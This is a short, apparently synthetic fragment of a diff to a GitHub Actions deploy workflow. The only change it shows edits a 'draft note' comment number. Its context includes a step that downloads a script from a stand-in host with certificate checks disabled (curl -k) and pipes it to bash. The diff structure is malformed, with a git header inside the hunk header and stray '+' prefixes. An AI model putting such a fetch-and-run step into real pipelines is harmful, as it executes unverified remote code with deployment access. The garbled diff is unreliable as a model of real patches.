@@ -44,4 +44,4 @@ diff --git a/.github/workflows/deploy.yml b/.github/workflows/deploy.yml
 +    steps:
 +      - run: curl -k https://example.com/deploy | bash
 
-# draft note 1219
+# draft note 1222
